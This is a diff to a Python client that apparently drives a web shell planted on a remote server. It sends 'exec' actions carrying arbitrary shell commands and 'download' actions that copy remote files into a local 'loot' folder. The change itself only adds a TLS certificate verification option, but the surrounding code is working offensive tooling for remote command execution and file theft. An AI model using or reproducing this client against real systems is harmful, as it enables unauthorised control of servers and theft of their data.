@@ -4,12 +4,13 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 22 May 2022
 
-
 import argparse
 import os
 import readline
 import requests
 import json
+
+VERIFY = True
 
 
 class CommandCompleter(object):
@@ -52,7 +53,8 @@ def remote_exec(target, cmd, verbose=False):
             data={
                 "action": "exec",
                 "cmd": cmd,
-            }
+            },
+            verify=VERIFY
         )
         if r.status_code == 200:
             data = r.json()
@@ -82,7 +84,8 @@ def remote_download(target, remote_path, local_path="./loot/"):
         data={
             "action": "download",
             "path": remote_path
-        }
+        },
+        verify=VERIFY
     )
 
     if r.status_code == 200:
@@ -108,6 +111,7 @@ def show_help():
 
 if __name__ == '__main__':
     options = parseArgs()
+    global VERIFY
 
     if not options.target.startswith("https://") and not options.target.startswith("http://"):
         options.target = "http://" + options.target
@@ -121,6 +125,8 @@ if __name__ == '__main__':
             requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
         except AttributeError:
             pass
+
+    VERIFY = not options.insecure_tls
 
     running = True
     while running:
@@ -140,3 +146,4 @@ if __name__ == '__main__':
                 remote_download(options.target, remote_path=args[1], local_path=args[2])
         else:
             remote_exec(options.target, cmd, verbose=options.verbose)
+
